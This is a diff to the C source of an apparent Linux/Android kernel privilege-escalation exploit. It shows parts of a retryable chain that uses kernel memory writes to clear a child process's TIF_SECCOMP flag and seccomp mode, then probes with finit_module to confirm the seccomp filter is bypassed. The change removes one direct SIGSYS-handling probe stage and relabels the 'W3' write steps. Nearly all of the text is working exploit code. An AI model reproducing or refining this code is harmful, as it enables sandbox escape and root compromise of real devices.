@@ -516,14 +516,6 @@ static uintptr_t perf_find_task(void) {
 
 struct child_pipes { int task_r, task_w, cmd_r, cmd_w, uid_r, uid_w; };
 
-/* W3a: catch the filter's SIGSYS so a missed write costs a retry, not the
- * child. */
-static volatile sig_atomic_t g_sigsys_hit;
-static void sigsys_probe_handler(int sig, siginfo_t *info, void *uctx) {
-  (void)sig; (void)info; (void)uctx;
-  g_sigsys_hit = 1;
-}
-
 static void child_main(struct child_pipes *p) {
   close(p->task_r); close(p->cmd_w); close(p->uid_r);
   setpgid(0, 0);  /* own group so the parent can kill the whole late-load
@@ -531,13 +523,6 @@ static void child_main(struct child_pipes *p) {
   fcntl(p->uid_w, F_SETFD, FD_CLOEXEC);  /* ksud-spawned daemons must not
                                           * inherit the report pipe */
   prctl(PR_SET_NAME, "ghostleaf_0123456789");
-  /* W3a probe: don't let the filter's SIGSYS kill us. */
-  struct sigaction sa;
-  memset(&sa, 0, sizeof(sa));
-  sa.sa_sigaction = sigsys_probe_handler;
-  sa.sa_flags = SA_SIGINFO;
-  sigemptyset(&sa.sa_mask);
-  sigaction(SIGSYS, &sa, NULL);
   uintptr_t my_task = perf_find_task();
   write(p->task_w, &my_task, sizeof(my_task));
   close(p->task_w);
@@ -546,9 +531,10 @@ static void child_main(struct child_pipes *p) {
   while (read(p->cmd_r, &cmd, 1) == 1) {
     if (cmd == 'C') { uint32_t uid = getuid(); write(p->uid_w, &uid, sizeof(uid)); }
     else if (cmd == 'F') {
-      /* Forked finit_module probe after W3b zeroed seccomp.mode: mode==2
-       * re-arms TIF_SECCOMP on fork (probe hits the filter); mode==0 lets it
-       * run filter-free to a normal errno. Forked so SIGSYS costs only this. */
+      /* Forked finit_module probe after W3 cleared TIF_SECCOMP and
+       * seccomp.mode: mode==2 re-arms TIF_SECCOMP on fork (probe hits the
+       * filter); mode==0 lets it run filter-free to a normal errno. Forked
+       * so SIGSYS costs only this. */
       uint32_t code = 0xffffffff;
       int probe_pipe[2];
       if (pipe(probe_pipe) == 0) {
@@ -573,20 +559,6 @@ static void child_main(struct child_pipes *p) {
           code = 0xfffffffd; /* probe killed by a signal (SIGSYS) */
         }
         close(probe_pipe[0]);
-      }
-      write(p->uid_w, &code, sizeof(code));
-    }
-    else if (cmd == 'D') {
-      /* W3a direct probe (a fork would re-inherit the filter): SIGSYS caught
-       * -> filter active; normal errno -> TIF_SECCOMP cleared. */
-      uint32_t code = 0xffffffff;
-      g_sigsys_hit = 0;
-      errno = 0;
-      long r = syscall(__NR_finit_module, 0, 0, 0);
-      if (g_sigsys_hit) {
-        code = 0xfffffffd;
-      } else {
-        code = (r == 0) ? 0 : (uint32_t)errno;
       }
       write(p->uid_w, &code, sizeof(code));
     }
@@ -735,29 +707,6 @@ static int verify_seccomp_probe_stage(void *context) {
   return 1;
 }
 
-static int verify_w3a_direct_stage(void *context) {
-  struct w2_stage_context *stage = context;
-  if (write(stage->pipes->cmd_w, "D", 1) != 1) return 0;
-
-  uint32_t code = 0xffffffff;
-  if (read(stage->pipes->uid_r, &code, sizeof(code)) !=
-      (ssize_t)sizeof(code)) {
-    pr_warning("W3a direct probe: no reply (child lost)\n");
-    return 0;
-  }
-  pr_info("W3a direct finit_module probe = 0x%x\n", code);
-  /* A normal errno means TIF_SECCOMP is clear. SIGSYS (0xfffffffd) means the
-   * filter still caught the probe (child survives via its handler);
-   * EPERM/ENOSYS count as failure because zeroing mode with TIF_SECCOMP set
-   * would BUG(). */
-  if (code == 0xfffffffd || code == 0xfffffffe || code == 0xffffffff ||
-      code == 1 || code == 38) {
-    return 0;
-  }
-  pr_success("W3a direct probe: filter bypassed in child (errno=%u)\n", code);
-  return 1;
-}
-
 static int verify_leaf_dir_stage(void *context) {
   struct w3_stage_context *stage = context;
   if (write(stage->pipes->cmd_w, "M", 1) != 1) return 0;
@@ -842,8 +791,8 @@ int run_exploit(int argc, char **argv) {
   int child_alive = 1;
   int seccomp_ok = 0;
 
-  /* W2+W3 as a retryable chain: the W3a probe can kill the child on a missed
-   * write, so respawn and redo instead of aborting. */
+  /* W2+W3 as a retryable chain: a missed W3 write or probe can kill the
+   * child, so respawn and redo instead of aborting. */
   for (int round = 1; round <= 3; round++) {
     if (round > 1) {
       pr_warning("W3 chain retry %d/3: respawning child\n", round);
@@ -932,14 +881,14 @@ int run_exploit(int argc, char **argv) {
     for (int attempt = 1; attempt <= 6; attempt++) {
       pr_info("W3: TIF_SECCOMP+mode attempt %d/6\n", attempt);
       if (attempt == 1) slab_drain();
-      int routed = do_one_write(flags_target, "W3a: TIF_SECCOMP", 1, 1);
+      int routed = do_one_write(flags_target, "W3: TIF_SECCOMP", 1, 1);
       if (!routed) {
         pr_warning("W3 attempt %d route failed; backing off\n", attempt);
         usleep(100000);
         continue;
       }
       usleep(50000);
-      routed = do_one_write(mode_target, "W3b: seccomp mode", 1, 1);
+      routed = do_one_write(mode_target, "W3: seccomp mode", 1, 1);
       if (!routed) {
         pr_warning("W3 attempt %d mode route failed; backing off\n", attempt);
         usleep(100000);
